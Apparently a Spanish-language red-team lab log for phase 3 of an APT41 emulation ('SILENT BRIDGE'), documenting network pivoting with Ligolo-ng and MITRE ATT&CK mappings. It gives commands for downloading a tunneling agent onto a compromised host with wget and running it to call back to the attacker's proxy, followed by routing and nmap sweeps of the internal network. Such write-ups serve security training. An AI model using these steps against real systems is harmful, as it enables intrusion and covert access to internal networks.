# Pivoting Log — Operación SILENT BRIDGE
## Fase 3 — Protocol Tunneling con Ligolo-ng
**Operación:** SILENT BRIDGE | **Adversario:** APT41 | **Framework:** MITRE ATT&CK v14  
**Operador:** Adrián Camacho | **Fecha:** —  
**Objetivo:** Establecer túnel TLS desde PROD hacia Kali y enrutar red interna

---

## FASE 3 — Pivoting: Ligolo-ng

**Táctica MITRE:** TA0011 — Command and Control  
**Técnicas:**
- T1572 — Protocol Tunneling
- T1090 — Proxy

**Herramienta:** Ligolo-ng (proxy + agent)

### Contexto táctico

Tras comprometer PROD en Fase 2, se confirma que este host tiene visibilidad hacia una red interna no accesible desde Kali. Ligolo-ng se despliega para establecer un túnel TLS persistente que permite operar contra los hosts internos directamente desde Kali, sin necesidad de proxychains ni herramientas intermedias.

A diferencia de Chisel (userspace SOCKS proxy), Ligolo-ng crea una interfaz de red virtual (tuntap) en Kali, haciendo el tráfico hacia la red interna totalmente transparente para cualquier herramienta (Nmap, Evil-WinRM, Sliver, etc.).

---

## 3.1 — Preparación del proxy en Kali
**Técnica MITRE:** T1572 — Protocol Tunneling  
**Captura:** `fase3-01-ligolo-proxy-listening.png`

```bash
# Crear interfaz TUN (solo necesario una vez por sesión de sistema)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Verificar interfaz creada
ip link show ligolo
```

**Output esperado:**
```
X: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc pfifo_fast state DOWN ...
```

```bash
# Arrancar el proxy Ligolo-ng
./proxy -selfcert -laddr 0.0.0.0:11601
```

**Output esperado:**
```
INFO[...] Starting self-signed certificate generation...
INFO[...] Proxy listening on 0.0.0.0:11601
```

| Parámetro | Valor | Descripción |
|-----------|-------|-------------|
| `-selfcert` | — | Genera certificado TLS autofirmado (no requiere CA) |
| `-laddr` | `0.0.0.0:11601` | Escucha en todas las interfaces, puerto 11601 |

---

## 3.2 — Transferencia y ejecución del agent en PROD
**Técnica MITRE:** T1105 — Ingress Tool Transfer  
**Captura:** `fase3-02-ligolo-agent-connected.png`

```bash
# ─── KALI — Servir el agent ───
cd /path/to/ligolo-ng/
python3 -m http.server 8888
```

```bash
# ─── PROD (desde la shell obtenida en Fase 2) ───
wget http://10.0.2.9:8888/agent -O /tmp/agent
chmod +x /tmp/agent

# Lanzar agent en background
/tmp/agent -connect 10.0.2.9:11601 -ignore-cert &
```

**Output en KALI (consola Ligolo-ng):**
```
INFO[...] Agent connected from <PROD_IP>:<PORT>
```

| Parámetro | Valor | Descripción |
|-----------|-------|-------------|
| `-connect` | `10.0.2.9:11601` | IP y puerto del proxy (Kali) |
| `-ignore-cert` | — | Aceptar certificado autofirmado del proxy |

---

## 3.3 — Activar el túnel
**Técnica MITRE:** T1090 — Proxy  
**Captura:** `fase3-03-ligolo-tunnel-active.png`

```
# ─── Consola interactiva Ligolo-ng (Kali) ───
ligolo-ng » session

# Output:
# [Agent : root@prod-machine] ...
# [0] Agent: root@prod ...

ligolo-ng » [0]   # seleccionar la sesión

ligolo-ng » ifconfig
```

**Output de `ifconfig` — interfaces visibles desde PROD:**
```
┌─────────────────────────────────────────────┐
│ Interface 0                                 │
│ Name: eth0                                  │
│ Hardware MAC: ...                           │
│ MTU: 1500                                   │
│ IPv4 address: 10.0.2.200/24                 │  ← Red externa (conocida)
├─────────────────────────────────────────────┤
│ Interface 1                                 │
│ Name: eth1                                  │
│ Hardware MAC: ...                           │
│ MTU: 1500                                   │
│ IPv4 address: 10.X.X.X/24                  │  ← RED INTERNA ← anotar este rango
└─────────────────────────────────────────────┘
```

> **Acción:** Anotar el rango de la red interna descubierto. Actualizar el diagrama de topología.

```
ligolo-ng » start
# INFO[...] Starting tunnel to agent root@prod-machine
```

---

## 3.4 — Enrutar red interna en Kali
**Captura:** `fase3-04-route-added-kali.png`

```bash
# ─── KALI (nueva terminal) ───
# Añadir ruta hacia la red interna a través de la interfaz ligolo
sudo ip route add 10.X.X.0/24 dev ligolo   # sustituir por el rango real

# Verificar ruta añadida
ip route | grep ligolo
```

**Output esperado:**
```
10.X.X.0/24 dev ligolo scope link
```

---

## 3.5 — Verificación de conectividad a través del túnel
**Técnica MITRE:** T1046 — Network Service Discovery  
**Captura:** `fase3-05-nmap-through-tunnel.png`

```bash
# ─── KALI — Ping sweep de la red interna (directamente, sin proxychains) ───
nmap -sn 10.X.X.0/24 --min-rate 5000

# Escaneo de puertos en hosts identificados
nmap -sC -sV -p- 10.X.X.X --min-rate 5000 -oA nmap/internal_sweep
```

**Output esperado:**
```
Host: 10.X.X.X (git-server)    Status: Up
Host: 10.X.X.X (pc-windows)   Status: Up
```

**Criterio de éxito Fase 3:** ✅ Hosts internos alcanzables directamente desde Kali a través del túnel Ligolo-ng. Sin proxychains — tráfico enrutado nativamente.

---

## Resumen Fase 3

```
PIVOTING — Estado final
════════════════════════════════════════════════════

TUNNEL Ligolo-ng
  Proxy (Kali)   → 0.0.0.0:11601 ✅
  Agent (PROD)   → conectado ✅
  Túnel TLS      → activo ✅
  Interfaz       → ligolo (tun) ✅

ROUTING
  Red interna    → 10.X.X.0/24 dev ligolo ✅
  Hosts internos → alcanzables desde Kali ✅

TÉCNICAS MITRE EJECUTADAS:
  T1105  → Ingress Tool Transfer (agent a PROD)
  T1572  → Protocol Tunneling (Ligolo-ng TLS)
  T1090  → Proxy (routing a través de PROD)
  T1046  → Network Service Discovery (verificación)
```

---

**Siguiente fase:** [post-exploitation.md](post-exploitation.md) — Fase 4: Enumeración red interna + Fase 5: Lateral Movement al PC Windows